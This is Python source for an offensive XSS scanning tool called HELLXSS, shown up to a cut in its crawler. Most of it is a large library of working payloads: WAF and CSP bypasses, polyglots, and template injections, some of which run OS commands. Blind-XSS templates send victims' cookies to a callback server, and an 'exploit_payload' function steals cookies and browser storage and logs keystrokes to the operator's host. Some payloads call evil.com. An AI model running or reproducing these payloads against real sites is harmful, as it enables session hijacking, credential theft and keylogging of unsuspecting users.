#!/usr/bin/env python3
# ╔═══════════════════════════════════════════════════════════════════════════════════╗
# ║                                                                                   ║
# ║  ██╗  ██╗███████╗██╗     ██╗       ██╗  ██╗███████╗███████╗                     ║
# ║  ██║  ██║██╔════╝██║     ██║       ╚██╗██╔╝██╔════╝██╔════╝                     ║
# ║  ███████║█████╗  ██║     ██║        ╚███╔╝ ███████╗███████╗                     ║
# ║  ██╔══██║██╔══╝  ██║     ██║        ██╔██╗ ╚════██║╚════██║                     ║
# ║  ██║  ██║███████╗███████╗███████╗  ██╔╝ ██╗███████║███████║                     ║
# ║  ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝  ╚═╝  ╚═╝╚══════╝╚══════╝                     ║
# ║                                                                                   ║
# ║          U L T R A   v 1 . 0  —  M A D E   I N   H E L L                       ║
# ║                                                                                   ║
# ║   Author  : RAJESH BAJIYA                                                        ║
# ║   Handle  : HACKEROFHELL                                                         ║
# ║   GitHub  : https://github.com/hellrider978                                      ║
# ║   Version : 1.0 ULTRA                                                            ║
# ║   Mission : Give URL → Find EVERY XSS → Automatically                           ║
# ║                                                                                   ║
# ║   "World's #1 XSS Hunter. Built by a man from Hell."                            ║
# ║                                                                                   ║
# ╚═══════════════════════════════════════════════════════════════════════════════════╝
#
# LEGAL: Authorized testing ONLY. Unauthorized use is illegal.
# USAGE:
#   python3 hellxss.py -t https://target.com
#   python3 hellxss.py -t https://target.com --ultra --crawl --blind-url https://your-server.com
#   python3 hellxss.py -t https://target.com/page?q=test --skip-modules 5,6,9

import argparse, sys, os, re, time, json, random, string, hashlib, html
import threading, queue, signal, base64, urllib.parse, copy
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] Install: pip3 install requests --break-system-packages"); sys.exit(1)

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

# ══════════════════════════════════════════════════════════════════════
# COLORS
# ══════════════════════════════════════════════════════════════════════
class C:
    RED='\033[0;31m'; BRED='\033[1;31m'; GRN='\033[0;32m'; BGRN='\033[1;32m'
    YLW='\033[1;33m'; CYN='\033[0;36m'; MAG='\033[0;35m'; BMAG='\033[1;35m'
    WHT='\033[1;37m'; DIM='\033[2m';    BLINK='\033[5m';   BOLD='\033[1m'; NC='\033[0m'

def ts():    return datetime.now().strftime('%H:%M:%S')
def log(m):  print(f"{C.CYN}[{ts()}][*]{C.NC} {m}")
def ok(m):   print(f"{C.BGRN}[{ts()}][+]{C.NC} {C.BOLD}{m}{C.NC}")
def vuln(m): print(f"{C.BRED}[{ts()}][🔥 XSS]{C.NC}{C.BLINK}★{C.NC}{C.BOLD} {m}{C.NC}")
def crit(m): print(f"{C.BRED}[{ts()}][☠ CRIT]{C.NC}{C.BLINK}☠{C.NC}{C.BOLD} {m}{C.NC}")
def warn(m): print(f"{C.YLW}[{ts()}][!]{C.NC} {m}")
def info(m): print(f"{C.MAG}[{ts()}][i]{C.NC} {m}")
def skip(m): print(f"{C.DIM}[{ts()}][-] SKIP: {m}{C.NC}")
def phase(n, t):
    print(f"\n{C.BMAG}{C.BOLD}")
    print(f"  ╔══════════════════════════════════════════════════════════════╗")
    print(f"  ║  MODULE {n:02d} ─ {t:<51}║")
    print(f"  ╚══════════════════════════════════════════════════════════════╝{C.NC}\n")

BANNER = f"""{C.BRED}{C.BOLD}
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║                                                                           ║
  ║  ██╗  ██╗███████╗██╗     ██╗       ██╗  ██╗███████╗███████╗             ║
  ║  ██║  ██║██╔════╝██║     ██║       ╚██╗██╔╝██╔════╝██╔════╝             ║
  ║  ███████║█████╗  ██║     ██║        ╚███╔╝ ███████╗███████╗             ║
  ║  ██╔══██║██╔══╝  ██║     ██║        ██╔██╗ ╚════██║╚════██║             ║
  ║  ██║  ██║███████╗███████╗███████╗  ██╔╝ ██╗███████║███████║             ║
  ║  ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝  ╚═╝  ╚═╝╚══════╝╚══════╝             ║
  ║                                                                           ║
  ║           v1.0 ULTRA  —  M A D E   I N   H E L L                        ║
  ║                                                                           ║
  ╠═══════════════════════════════════════════════════════════════════════════╣
  ║  Author : RAJESH BAJIYA      Handle : HACKEROFHELL                      ║
  ║  GitHub : hellrider978        Mission: World's #1 XSS Hunter            ║
  ║  "Finds Reflected · Stored · DOM · Blind · mXSS · Template · and more" ║
  ╚═══════════════════════════════════════════════════════════════════════════╝
{C.NC}"""

# ══════════════════════════════════════════════════════════════════════
# ARGUMENT PARSER
# ══════════════════════════════════════════════════════════════════════
def build_parser():
    p = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="HELLXSS v1.0 ULTRA — by RAJESH BAJIYA (HACKEROFHELL)",
        epilog="""
EXAMPLES:
  python3 hellxss.py -t https://target.com
  python3 hellxss.py -t https://target.com --ultra --crawl
  python3 hellxss.py -t https://target.com --blind-url https://your-server.com
  python3 hellxss.py -t https://target.com -p http://127.0.0.1:8080
  python3 hellxss.py -t https://target.com --cookie "session=abc123"
  python3 hellxss.py -t https://target.com --skip-modules 5,6,9
  python3 hellxss.py -t https://target.com/page?q=test --skip-crawl
        """)
    p.add_argument('-t','--target',      required=True, help='Target URL or domain')
    p.add_argument('-u','--url',         help='Specific URL with parameter to test')
    p.add_argument('-f','--url-file',    help='File with list of URLs to test')
    p.add_argument('-o','--output',      default=str(Path.home()/'hellxss_output'), help='Output directory')
    p.add_argument('--cookie',           help='Session cookies e.g. "PHPSESSID=abc"')
    p.add_argument('--headers',          help='Custom headers e.g. "Authorization: Bearer TOKEN"')
    p.add_argument('--token',            help='Bearer token')
    p.add_argument('--auth',             help='Basic auth "user:pass"')
    p.add_argument('-p','--proxy',       help='HTTP proxy e.g. http://127.0.0.1:8080')
    p.add_argument('--crawl',            action='store_true', help='Deep crawl target')
    p.add_argument('--deep',             action='store_true', help='Maximum depth')
    p.add_argument('--ultra',            action='store_true', help='Ultra mode — everything')
    p.add_argument('--level',            type=int, default=2, choices=[1,2,3], help='Test depth 1-3')
    p.add_argument('--threads',          type=int, default=10, help='Thread count')
    p.add_argument('--timeout',          type=int, default=15, help='Request timeout')
    p.add_argument('--delay',            type=float, default=0, help='Delay between requests')
    p.add_argument('--blind-url',        help='Server for blind XSS callbacks e.g. https://your-server.com')
    p.add_argument('--waf-bypass',       action='store_true', help='Enable WAF bypass encoding')
    p.add_argument('--random-agent',     action='store_true', help='Rotate User-Agents')
    p.add_argument('--user-agent',       help='Custom User-Agent')
    p.add_argument('--webhook',          help='Slack/Discord webhook for alerts')
    # Skip flags
    p.add_argument('--skip-crawl',       action='store_true', help='Skip crawling')
    p.add_argument('--skip-dom',         action='store_true', help='Skip DOM XSS analysis (Module 5)')
    p.add_argument('--skip-blind',       action='store_true', help='Skip blind XSS (Module 6)')
    p.add_argument('--skip-headers',     action='store_true', help='Skip header XSS (Module 7)')
    p.add_argument('--skip-stored',      action='store_true', help='Skip stored XSS (Module 4)')
    p.add_argument('--skip-template',    action='store_true', help='Skip template injection (Module 12)')
    p.add_argument('--skip-modules',     help='Skip modules by number e.g. --skip-modules 5,6,9')
    p.add_argument('--verify-ssl',       action='store_true', help='Verify SSL certs')
    p.add_argument('--silent',           action='store_true', help='Suppress non-finding output')
    return p

# ══════════════════════════════════════════════════════════════════════
# HTTP ENGINE
# ══════════════════════════════════════════════════════════════════════
USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
]

class HTTP:
    def __init__(self, args):
        self.args    = args
        self.session = requests.Session()
        self.lock    = threading.Lock()
        self.count   = 0
        self._setup()

    def _setup(self):
        a = self.args
        if a.proxy:
            self.session.proxies = {'http': a.proxy, 'https': a.proxy}
        self.session.verify = getattr(a, 'verify_ssl', False)
        self.bh = {
            'Accept':          'text/html,application/xhtml+xml,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection':      'keep-alive',
            'User-Agent':      getattr(a, 'user_agent', None) or USER_AGENTS[0],
        }
        if getattr(a, 'cookie', None):
            for pair in a.cookie.split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    self.session.cookies.set(k.strip(), v.strip())
        if getattr(a, 'headers', None):
            for line in a.headers.split('\n'):
                if ':' in line:
                    k, v = line.split(':', 1)
                    self.bh[k.strip()] = v.strip()
        if getattr(a, 'token', None):
            self.bh['Authorization'] = f'Bearer {a.token}'
        if getattr(a, 'auth', None) and ':' in a.auth:
            u, p = a.auth.split(':', 1)
            self.session.auth = (u, p)

    def get(self, url, params=None, headers=None, allow_redirects=True):
        return self._req('GET', url, params=params, headers=headers,
                         allow_redirects=allow_redirects)

    def post(self, url, data=None, json_data=None, headers=None):
        return self._req('POST', url, data=data, json=json_data, headers=headers)

    def _req(self, method, url, **kw):
        if self.args.delay: time.sleep(self.args.delay)
        hdrs = dict(self.bh)
        if getattr(self.args, 'random_agent', False):
            hdrs['User-Agent'] = random.choice(USER_AGENTS)
        if kw.get('headers'):
            hdrs.update(kw.pop('headers'))
        kw['headers'] = hdrs
        kw.setdefault('timeout', self.args.timeout)
        with self.lock: self.count += 1
        for i in range(3):
            try:
                return self.session.request(method, url, **kw)
            except requests.Timeout:
                if i == 2: return None
            except Exception:
                if i == 2: return None
                time.sleep(0.3)
        return None

# ══════════════════════════════════════════════════════════════════════
# FINDINGS DATABASE
# ══════════════════════════════════════════════════════════════════════
class DB:
    def __init__(self, outdir, target):
        self.lock     = threading.Lock()
        self.findings = []
        safe = re.sub(r'[^\w\-.]', '_', target.replace('https://','').replace('http://',''))[:80]
        self.outdir   = Path(outdir) / safe
        self.outdir.mkdir(parents=True, exist_ok=True)
        self.jpath    = self.outdir / 'hellxss_findings.json'
        self._init(target)

    def _init(self, target):
        self.jpath.write_text(json.dumps({
            'target': target, 'author': 'RAJESH BAJIYA',
            'handle': 'HACKEROFHELL', 'github': 'hellrider978',
            'tool': 'HELLXSS v1.0 ULTRA',
            'date': datetime.utcnow().isoformat()+'Z',
            'findings': []
        }, indent=2))

    def add(self, f):
        with self.lock:
            self.findings.append(f)
            d = json.loads(self.jpath.read_text())
            d['findings'] = self.findings
            self.jpath.write_text(json.dumps(d, indent=2))

    def has(self, url, param, xss_type):
        with self.lock:
            return any(x['url']==url and x['parameter']==param and x['type']==xss_type
                       for x in self.findings)

    def count(self):
        with self.lock: return len(self.findings)

    def by_severity(self):
        with self.lock:
            s = defaultdict(int)
            for f in self.findings: s[f.get('severity','HIGH')] += 1
            return dict(s)

# ══════════════════════════════════════════════════════════════════════
# XSS PAYLOAD LIBRARY — 200+ PAYLOADS
# ══════════════════════════════════════════════════════════════════════
class XPayloads:
    MARKER_PREFIX = "HELLXSS"

    # ── Basic Reflected ──────────────────────────────────────────────
    BASIC = [
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '</title><script>alert(1)</script>',
        '</textarea><script>alert(1)</script>',
        '</style><script>alert(1)</script>',
        '</script><script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
    ]

    # ── Event Handlers ────────────────────────────────────────────────
    EVENT_HANDLERS = [
        '<img src=x onmouseover=alert(1)>',
        '<div onmouseover=alert(1)>test</div>',
        '<a href=# onclick=alert(1)>click</a>',
        '<button onclick=alert(1)>click</button>',
        '<marquee onstart=alert(1)>XSS</marquee>',
        '<body onresize=alert(1)>',
        '<iframe onload=alert(1)>',
        '<object onerror=alert(1)>',
        '<textarea onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<keygen autofocus onfocus=alert(1)>',
        '<video autoplay onplay=alert(1)><source src=x>',
        '<img src=x onerror=alert`1`>',
        '<svg onmouseover=alert(1)>',
        '<form><button formaction=javascript:alert(1)>click',
        '<isindex type=image src=1 onerror=alert(1)>',
        '<script>window.onload=function(){alert(1)}</script>',
        '<link rel=stylesheet href="javascript:alert(1)">',
    ]

    # ── WAF Bypass Payloads ───────────────────────────────────────────
    WAF_BYPASS = [
        # HTML entity encoding
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',
        # Case bypass
        '<ScRiPt>alert(1)</ScRiPt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<Img src=x OnError=alert(1)>',
        '<IMG SRC=x ONERROR=alert(1)>',
        '<SVG ONLOAD=alert(1)>',
        # Null bytes
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        '<img src=x onerror\x00=alert(1)>',
        # Space alternatives
        '<svg\tonload=alert(1)>',
        '<svg\nonload=alert(1)>',
        '<svg\ronload=alert(1)>',
        # Slash tricks
        '<script/src=//evil.com/x.js>',
        '</script><script>alert(1)</script>',
        # Double encoding
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%253Cscript%253Ealert(1)%253C/script%253E',
        # Unicode bypass
        '\u003cscript\u003ealert(1)\u003c/script\u003e',
        # Template literal
        '<img src=x onerror=alert`1`>',
        # JSFuck-style
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        # Comment tricks
        '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
        '<!--<script>--><script>alert(1);</script>',
        # Protocol bypass
        '<a href="javascript:alert(1)">click</a>',
        '<a href="JaVaScRiPt:alert(1)">click</a>',
        '<a href="javascript&#58;alert(1)">click</a>',
        '<a href="\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74:alert(1)">',
        '<a href="java\tscript:alert(1)">click</a>',
        # Fromcharcode
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        # Backtick bypass
        '<svg/onload=alert`XSS`>',
        # Obfuscation
        '<script>a=\'ale\';b=\'rt\';c=\'(1)\';eval(a+b+c)</script>',
        # data: URI
        '<iframe src="data:text/html,<script>alert(1)</script>">',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        # srcdoc
        '<iframe srcdoc="<script>alert(1)</script>">',
        # form action
        '<form action="javascript:alert(1)"><input type=submit>',
        # link/style
        '<style>@import "javascript:alert(1)"</style>',
        # meta refresh
        '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
        # SVG animate
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<svg><set onbegin=alert(1) attributeName=x>',
        # XLink
        '<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100/>',
        # Use element
        '<svg><use href="data:image/svg+xml,<svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'><animate onbegin=alert(1) attributeName=x/></svg>#x"/>',
        # noscript
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        # HTML5 semantic tags
        '<details/open/ontoggle=alert`1`>',
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
    ]

    # ── Attribute Context Breakout ────────────────────────────────────
    ATTRIBUTE = [
        '" onmouseover="alert(1)"',
        "' onmouseover='alert(1)'",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onclick="alert(1)"',
        "' onclick='alert(1)'",
        '" onerror="alert(1)"',
        '"><script>alert(1)</script>',
        "' ><script>alert(1)</script>",
        '" style="animation-name:rotation" onanimationstart="alert(1)"',
        '" onpointerdown="alert(1)"',
        '" ontouchstart="alert(1)"',
        '" onwheel="alert(1)"',
        '" ondrag="alert(1)"',
        "javascript:alert(1)",
        "javascript&#58;alert(1)",
        "JaVaScRiPt:alert(1)",
    ]

    # ── JavaScript Context ─────────────────────────────────────────────
    JS_CONTEXT = [
        "';alert(1)//",
        '";alert(1)//',
        "';alert(1)//",
        '</script><script>alert(1)</script>',
        '\';alert(1)//\'',
        '`; alert(1);//`',
        "\\'; alert(1);//",
        '"-alert(1)-"',
        "'-alert(1)-'",
        '`-alert(1)-`',
        ');alert(1)//',
        '}); alert(1); //',
        '\n</script><script>alert(1)</script>',
        '</script><img src=x onerror=alert(1)>',
    ]

    # ── URL Context ────────────────────────────────────────────────────
    URL_CONTEXT = [
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        'JaVaScRiPt:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:alert(1)',
        '//evil.com/xss',
        '\\\\evil.com/xss',
    ]

    # ── DOM XSS Sinks ────────────────────────────────────────────────
    DOM_SINKS = [
        r'document\.write\s*\(',
        r'document\.writeln\s*\(',
        r'\.innerHTML\s*=',
        r'\.outerHTML\s*=',
        r'\.insertAdjacentHTML\s*\(',
        r'eval\s*\(',
        r'setTimeout\s*\(',
        r'setInterval\s*\(',
        r'new\s+Function\s*\(',
        r'location\s*=',
        r'location\.href\s*=',
        r'location\.assign\s*\(',
        r'location\.replace\s*\(',
        r'document\.domain\s*=',
        r'\.src\s*=',
        r'\.href\s*=',
        r'window\.open\s*\(',
        r'jQuery\s*\(\s*["\']<',
        r'\$\s*\(\s*["\']<',
        r'\.html\s*\(',
        r'\.append\s*\(',
        r'\.prepend\s*\(',
        r'\.after\s*\(',
        r'\.before\s*\(',
        r'\.replaceWith\s*\(',
        r'dangerouslySetInnerHTML',
        r'v-html\s*=',
        r'\[innerHTML\]',
    ]

    # ── DOM XSS Sources ──────────────────────────────────────────────
    DOM_SOURCES = [
        r'location\.search',
        r'location\.hash',
        r'location\.href',
        r'location\.pathname',
        r'document\.URL',
        r'document\.referrer',
        r'document\.cookie',
        r'window\.name',
        r'history\.pushState',
        r'history\.replaceState',
        r'postMessage',
        r'localStorage\.',
        r'sessionStorage\.',
        r'URLSearchParams',
        r'querystring',
    ]

    # ── Template Injection Payloads ───────────────────────────────────
    TEMPLATE = {
        'Angular':     ['{{constructor.constructor("alert(1)")()}}',
                        '{{$on.constructor("alert(1)")()}}',
                        '{{7*7}}',  # 49 = Angular confirmed
                        '<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>'],
        'Vue':         ['{{constructor.constructor("alert(1)")()}}',
                        '{{_self.window.alert(1)}}',
                        '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>'],
        'React':       ['<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}/>',
                        '{`${alert(1)}`}'],
        'Handlebars':  ['{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return alert(1);"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'],
        'Jinja2':      ['{{config.items()}}',
                        '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                        '{{7*7}}'],  # 49 confirmed
        'Twig':        ['{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'],
        'Generic':     ['${alert(1)}', '#{alert(1)}', '<%=alert(1)%>', '{{7*7}}',
                        '<%= 7*7 %>', '{7*7}', '${{7*7}}', '@(7*7)', '#set($x=7*7)${x}'],
    }

    # ── Polyglot Payloads ────────────────────────────────────────────
    POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
        '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'',
        "<script>Object.defineProperty(window,'x',{get:function(){alert(1)}}),x</script>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
        'onclick=alert(1)//<button onclick=alert(1)//> and "><SCRIPT>alert(1)</SCRIPT>',
    ]

    # ── Blind XSS Payloads (with callback) ───────────────────────────
    BLIND_TEMPLATE = [
        '<script src="{url}/hellxss/{id}"></script>',
        '<img src="{url}/hellxss/{id}" onerror="this.src=\'{url}/hellxss/{id}?cookie=\'+document.cookie">',
        '"><script src="{url}/hellxss/{id}"></script>',
        "'><script src=\"{url}/hellxss/{id}\"></script>",
        '</textarea><script src="{url}/hellxss/{id}"></script>',
        '</title><script src="{url}/hellxss/{id}"></script>',
        '<svg onload="var s=document.createElement(\'script\');s.src=\'{url}/hellxss/{id}\';document.body.appendChild(s)">',
        '"><img src=x onerror="fetch(\'{url}/hellxss/{id}?cookie=\'+document.cookie)">',
        "';var s=document.createElement('script');s.src='{url}/hellxss/{id}';document.body.appendChild(s)//",
        '<script>document.location="{url}/hellxss/{id}?cookie="+document.cookie</script>',
        # XSS Hunter style
        '<img src="x" onerror="var x=new XMLHttpRequest();x.open(\'GET\',\'{url}/hellxss/{id}?c=\'+document.cookie,true);x.send()">',
        '"><svg/onload=fetch(`{url}/hellxss/{id}?c=${document.cookie}`)>',
    ]

    # ── mXSS Payloads ────────────────────────────────────────────────
    MXSS = [
        '<listing><img title="</listing><img src=x onerror=alert(1)>">',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<style><img src="</style><img src=x onerror=alert(1)>">',
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
        '<xmp><img title="</xmp><img src=x onerror=alert(1)>">',
        '<textarea><img src="</textarea><img src=x onerror=alert(1)>">',
        '<select><img src="</select><img src=x onerror=alert(1)>">',
        '<script><img src="</script><img src=x onerror=alert(1)>">',
    ]

    # ── CSP Bypass ───────────────────────────────────────────────────
    CSP_BYPASS = [
        # JSONP endpoints
        '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
        '<script src="https://www.googletagmanager.com/gtag/js?callback=alert(1)"></script>',
        # Angular CSP bypass
        '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script><div ng-app>{{constructor.constructor("alert(1)")()}}</div>',
        # nonce leak
        '<base href="//evil.com/">',
        # open redirect to XSS
        '<script src="//evil.com/script.js"></script>',
        # style injection when style-src is present
        '<style>@import "//evil.com/style.css"</style>',
    ]

    # ── Stored XSS Payloads (for forms/comments) ─────────────────────
    STORED = [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror="alert(document.domain)">',
        '"><img src=x onerror=alert(1)>',
        '<svg onload=alert(document.domain)>',
        '<script>document.write("<img src=x onerror=alert(1)>")</script>',
        '<!--><script>alert(1)</script>',
        '<a href="javascript:alert(1)">click me</a>',
        '<body onload=alert(1)>',
        '<details open ontoggle=alert(1)>click</details>',
        '<input value=""><script>alert(1)</script>',
        '";\nalert(1);//',
        "';alert(1)//",
    ]

    # ── Header XSS ───────────────────────────────────────────────────
    HEADER_XSS = {
        'User-Agent':       ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>'],
        'Referer':          ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>'],
        'X-Forwarded-For':  ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>'],
        'X-Real-IP':        ['<script>alert(1)</script>'],
        'X-Forwarded-Host': ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>'],
        'Accept-Language':  ['<script>alert(1)</script>'],
        'Origin':           ['<script>alert(1)</script>', 'https://<script>alert(1)</script>.com'],
        'X-Custom-IP':      ['<script>alert(1)</script>'],
    }

    # ── DOM Clobbering ───────────────────────────────────────────────
    DOM_CLOBBER = [
        '<form id="x"><input name="action" value="javascript:alert(1)"></form>',
        '<a id="location" href="javascript:alert(1)">click</a>',
        '<form id="x"><input name="nodeName"></form>',
        '<img name="src"><form><img name="onerror" id="x">',
    ]

    # ── Prototype Pollution to XSS ────────────────────────────────────
    PROTO_POLL = [
        '?__proto__[innerHTML]=<img+src=x+onerror=alert(1)>',
        '?constructor[prototype][innerHTML]=<img+src=x+onerror=alert(1)>',
        '?__proto__[src]=1&__proto__[onerror]=alert(1)',
    ]

    # ── SVG/XML ───────────────────────────────────────────────────────
    SVG_XML = [
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
        '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
        '<?xml version="1.0"?><root><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></root>',
        b'''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>''',
    ]

    @staticmethod
    def make_marker(prefix="HELLXSS"):
        return f"{prefix}_{''.join(random.choices(string.ascii_uppercase+string.digits, k=8))}"

    @staticmethod
    def marker_payload(marker, variant=0):
        payloads = [
            f'<script>alert("{marker}")</script>',
            f'"><script>alert("{marker}")</script>',
            f"'><script>alert('{marker}')</script>",
            f'<img src=x onerror=alert("{marker}")>',
            f'"><img src=x onerror=alert("{marker}")>',
            f'<svg onload=alert("{marker}")>',
            f'</title><script>alert("{marker}")</script>',
            f'</textarea><script>alert("{marker}")</script>',
        ]
        return payloads[variant % len(payloads)]

    @staticmethod
    def blind_payload(server_url, uid):
        return [t.format(url=server_url.rstrip('/'), id=uid)
                for t in XPayloads.BLIND_TEMPLATE]

    @staticmethod
    def exploit_payload(server_url):
        """Full cookie stealer + keylogger payload"""
        return (f'<script>'
                f'var d=document;'
                f'var info={{'
                f'"cookie":d.cookie,'
                f'"url":d.location.href,'
                f'"dom":d.title,'
                f'"ua":navigator.userAgent,'
                f'"ls":JSON.stringify(localStorage),'
                f'"ss":JSON.stringify(sessionStorage)'
                f'}};'
                f'fetch("{server_url}/hellxss/steal?d="+btoa(JSON.stringify(info)));'
                f'var klog="";'
                f'd.addEventListener("keydown",function(e){{klog+=e.key;if(klog.length>20){{fetch("{server_url}/hellxss/keys?k="+btoa(klog));klog="";}}}})'
                f'</script>')

# ══════════════════════════════════════════════════════════════════════
# MODULE 01 — TARGET INTELLIGENCE & CRAWLING
# ══════════════════════════════════════════════════════════════════════
class Intel:
    def __init__(self, http, args, db):
        self.http    = http; self.args = args; self.db = db
        self.base    = args.target.rstrip('/')
        self.domain  = urllib.parse.urlparse(self.base).netloc
        self.visited = set()
        self.lock    = threading.Lock()
        # Discovered targets
        self.param_urls  = []
        self.forms       = []
        self.login_forms = []
        self.js_urls     = []
        self.all_urls    = []
        self.upload_forms= []
        self.api_urls    = []

    def run(self):
        phase(1, "TARGET INTELLIGENCE & CRAWLING")
        self._process(self.base)
        if args_url := getattr(self.args, 'url', None):
            self._process(args_url)
            if '?' in args_url: self.param_urls.append(args_url)
        if getattr(self.args, 'url_file', None):
            try:
                for line in open(self.args.url_file):
                    u = line.strip()
                    if u.startswith('http'):
                        self._process(u)
                        if '?' in u: self.param_urls.append(u)
            except Exception as e: warn(f"URL file: {e}")
        if not getattr(self.args, 'skip_crawl', False):
            self._crawl(self.base, depth=3 if self.args.deep else 2)
        self._wayback()
        self._mine_js()
        # Dedup
        self.param_urls = list(set(self.param_urls))
        self.js_urls    = list(set(self.js_urls))
        ok(f"GET param URLs: {len(self.param_urls)}")
        ok(f"POST forms: {len(self.forms)}")
        ok(f"Login forms: {len(self.login_forms)}")
        ok(f"JS files: {len(self.js_urls)}")
        ok(f"Upload forms: {len(self.upload_forms)}")
        ok(f"API endpoints: {len(self.api_urls)}")

    def _process(self, url):
        with self.lock:
            self.all_urls.append(url)
        if '?' in url:
            with self.lock: self.param_urls.append(url)
        if any(x in url.lower() for x in ['/api/', '/rest/', '/v1/', '/v2/', '.json', '/graphql']):
            with self.lock: self.api_urls.append(url)

    def _crawl(self, start, depth=2):
        log(f"Crawling {start} depth={depth}...")
        q = queue.Queue()
        q.put((start, 0))
        def worker():
            while True:
                try: url, d = q.get(timeout=3)
                except queue.Empty: break
                with self.lock:
                    if url in self.visited: q.task_done(); continue
                    self.visited.add(url)
                resp = self.http.get(url)
                if not resp: q.task_done(); continue
                self._process(url)
                self._extract_forms(resp.text, url)
                self._extract_js(resp.text, url)
                if d < depth:
                    for link in self._links(resp.text, url):
                        with self.lock:
                            if link not in self.visited and self._same(link):
                                q.put((link, d+1))
                q.task_done()
        ts_list = [threading.Thread(target=worker, daemon=True)
                   for _ in range(min(self.args.threads, 5))]
        for t in ts_list: t.start()
        q.join()

    def _links(self, txt, base):
        links = set()
